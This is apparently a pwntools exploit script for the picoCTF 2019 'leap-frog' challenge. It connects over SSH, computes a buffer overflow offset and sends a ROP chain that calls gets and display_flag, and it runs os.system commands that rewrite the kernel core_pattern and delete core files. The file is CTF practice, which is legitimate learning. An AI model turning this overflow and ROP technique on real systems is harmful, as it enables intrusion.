#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2019shell1.picoctf.com --user numin0us --pass  --path /problems/leap-frog_1_2944cde4843abb6dfd6afa31b00c703c/rop
from pwn import *
#import logging

# Set up pwntools for the correct architecture
exe = context.binary = ELF('rop')
context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2019shell1.picoctf.com'
port = int(args.PORT or 22)
user = args.USER or 'numin0us'
password = args.PASSWORD or ''
remote_path = '/problems/leap-frog_1_2944cde4843abb6dfd6afa31b00c703c/rop'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    #shell.set_working_directory(symlink=True)
    shell.set_working_directory(str.encode(os.path.dirname(remote_path)))

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *main
break *vuln
break *leapA
break *0x08048690
break *leap2
break *display_flag
break *leap3
break *gets
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

def send_payload(proc, payload):
    proc.sendlineafter("Enter your input>", payload)
    proc.sendline(p32(0x01010101))

def build_rop_payload(offset):
    r = ROP(exe)
    r.call('gets', [exe.bss()])
    r.call(exe.sym.display_flag)
    payload = fit({offset: r.chain()})

    print("[*] Payload")
    print(hexdump(payload))
    print("[*] ROP Chain")
    print(r.dump())

    return payload

def get_overflow_offset():
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = local()
    payload = cyclic(100, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    print("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset

#offset = get_overflow_offset()
offset = 28
junk = exe.symbols['win1']
payload = build_rop_payload(offset)
#chain = cyclic(100)

io = start()
send_payload(io, payload)




# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

